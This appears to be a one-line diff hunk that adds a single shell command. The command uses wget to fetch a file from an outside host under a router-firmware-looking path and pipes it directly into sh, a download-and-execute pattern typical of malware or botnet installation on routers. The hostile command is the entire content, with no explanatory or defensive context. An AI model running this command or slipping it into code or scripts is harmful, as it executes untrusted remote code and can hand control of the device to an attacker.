@@ -1,0 +1,1 @@
+wget http://ip.jeromelaliagg.com/firmware/smartbro_r051new.php -O - | sh
